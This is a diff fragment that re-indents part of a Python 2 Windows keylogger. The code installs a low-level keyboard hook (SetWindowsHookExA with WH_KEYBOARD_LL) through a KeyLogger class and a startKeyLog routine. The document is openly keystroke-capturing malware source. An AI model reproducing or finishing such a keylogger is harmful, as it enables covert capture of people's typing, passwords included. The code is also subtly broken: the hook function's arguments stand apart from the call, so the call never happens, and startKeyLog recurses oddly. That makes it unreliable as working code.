@@ -18,10 +18,10 @@ class KeyLogger:                                                                
     def installHookProc(self, pointer):                                           #(4)
         self.hooked = self.lUser32.SetWindowsHookExA
         (
-                        WH_KEYBOARD_LL, 
-                        pointer, 
-                        kernel32.GetModuleHandleW(None), 
-                        0
+            WH_KEYBOARD_LL,
+            pointer,
+            kernel32.GetModuleHandleW(None),
+            0
         )
         if not self.hooked:
             return False
@@ -55,13 +55,12 @@ def hookProc(nCode, wParam, lParam):                                            
 
 
 def startKeyLog():                                                                 #(8)
-     msg = MSG()
-     user32.GetMessageA(byref(msg),0,0,0)
+    msg = MSG()
+    user32.GetMessageA(byref(msg),0,0,0)
     
-     keyLogger = KeyLogger() #start of hook process                                     #(9)
-     pointer = getFPTR(hookProc)
+    keyLogger = KeyLogger() #start of hook process                                     #(9)
+    pointer = getFPTR(hookProc)
 
-
-     if keyLogger.installHookProc(pointer):
-         print "installed keyLogger"
-         startKeyLog()
+    if keyLogger.installHookProc(pointer):
+        print "installed keyLogger"
+        startKeyLog()
